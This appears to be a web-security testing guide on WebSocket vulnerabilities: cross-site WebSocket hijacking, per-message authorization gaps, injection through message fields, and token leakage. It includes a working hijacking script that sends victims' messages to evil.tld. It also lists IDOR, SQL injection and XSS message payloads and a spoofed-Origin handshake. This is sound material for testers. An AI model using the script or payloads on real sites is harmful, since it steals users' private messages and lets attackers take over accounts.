# WebSockets

WebSockets open a long-lived, bidirectional channel that bypasses much of the request-response security machinery people rely on. Authorization is often checked once at the handshake and never again, the `Origin` header is frequently ignored, and messages are a fresh injection surface that WAFs and testers tend to skip.

## The mental model

A WebSocket starts as an HTTP `Upgrade` handshake, then becomes a raw message channel. Two trust problems follow. First, the handshake is where auth and origin should be enforced, and it often is not (or only partially). Second, once open, each message is application input that reaches the same backends as HTTP, but the per-message authorization and validation are usually weaker because developers think "the connection is already authenticated."

## Where it hides / tell-tales

- **Cross-Site WebSocket Hijacking (CSWSH)**: the handshake authenticates via cookies and the server does not validate `Origin`. A cross-site page opens a WebSocket to the target; the browser attaches the victim's cookies; the attacker's JS can now send and receive on the victim's authenticated channel. This is CSRF for WebSockets, and it reads responses.
- **Auth only at handshake**: the connection is authorized once, but individual messages (which may select resources, change state, or address other users) are not re-checked. Message-level IDOR/BOLA lives here.
- **Message injection**: JSON/text messages flow into SQL, templates, command execution, or get broadcast to other users (stored XSS over WebSocket). The channel is a blind spot for scanners and WAFs.
- **No rate limiting on messages**: brute force, enumeration, and flooding over a channel that the HTTP rate limiter never sees.
- **Tokens in the URL**: the WebSocket URL carries a session token (`wss://target/ws?token=...`), leaking via logs and `Referer`.

## Real material

CSWSH attacker page (works when `Origin` is not validated and auth is cookie-based):

```html
<script>
const ws = new WebSocket('wss://app.target.com/ws');   // victim's cookies auto-attach
ws.onopen  = () => ws.send(JSON.stringify({action:'getMessages'}));
ws.onmessage = e => fetch('https://evil.tld/c?d='+encodeURIComponent(e.data));
</script>
```
If the victim visits this page while logged in, their private messages stream to the attacker.

Per-message IDOR (connection authenticated as you, but the message addresses another user's object):

```json
{"action":"readConversation","conversationId":"VICTIM-CONV-9931"}
{"action":"updateProfile","userId":"someone-else","email":"attacker@evil.tld"}
```

Injection through a message field (same sinks as HTTP):

```json
{"action":"search","query":"' OR 1=1-- -"}
{"action":"setName","name":"<img src=x onerror=alert(1)>"}   // broadcast -> stored XSS
```

Handshake to inspect/replay:

```http
GET /ws HTTP/1.1
Host: app.target.com
Upgrade: websocket
Connection: Upgrade
Origin: https://evil.tld          <-- does the server reject this? often not
Sec-WebSocket-Key: ...
Cookie: session=<victim>
```

## Beyond the basics

- **CSWSH is the signature WebSocket bug**: always test whether the handshake validates `Origin`. If not, and auth rides on cookies, you have cross-site read/write of the victim's channel. Confirm by connecting from an unrelated origin with the session cookie and seeing authenticated data. Mitigations are origin checks plus CSRF-token-in-handshake; note which (if any) are present.
- **Re-authorize every message**: enumerate all message `action` types (read the client JS, which contains the full protocol), then test each for object-level and function-level authorization independently of the handshake. The handshake being authenticated as you does not mean the message authorizing an action on someone else's data is checked.
- **Message replay and sequencing**: capture and replay messages, reorder them, or send a privileged message out of the expected sequence; stateful protocols over WS often assume ordered, well-formed client behavior.
- **WebSocket as an injection channel that bypasses WAF**: many WAFs inspect the HTTP handshake but not subsequent frames. Payloads (SQLi, XSS, command injection) that are blocked over HTTP may sail through over WebSocket. Re-test known-blocked injections over the socket.
- **Tooling**: Burp supports WebSocket interception and repeat; use it to fuzz message fields, replay, and modify frames in-flight. The client JS is your protocol documentation; read it to enumerate actions and message shapes.
- **Compression and resource bugs**: `permessage-deflate` has had memory issues; oversized or deeply nested messages can DoS. Note, do not run against production.
- **Token leakage and reconnection**: tokens in the WS URL leak; also check whether a stale token still opens a socket after logout (session invalidation gap, see `Session-and-Cookie-Security.md`).

## What to watch for

- CSWSH requires cookie-based handshake auth and a missing origin check; if auth is a bearer token the attacker cannot set cross-site, CSWSH does not apply.
- A connection you can open from another origin is only impactful if it returns or affects the victim's authenticated data; confirm that.
- Scanners rarely cover WebSockets, so manual protocol enumeration is required; do not assume "no findings" means secure.
- Exfiltrating real users' messages is out of bounds; prove with your own two accounts.

## Hunting checklist

- Read the client JS to enumerate every message action and shape.
- Test the handshake for `Origin` validation and CSRF-token requirement (CSWSH).
- Test per-message object and function authorization independently of the handshake.
- Fuzz message fields for SQLi/XSS/command injection, including payloads blocked over HTTP.
- Test message replay, reordering, and out-of-sequence privileged actions.
- Check for tokens in the WS URL and whether sockets survive logout.
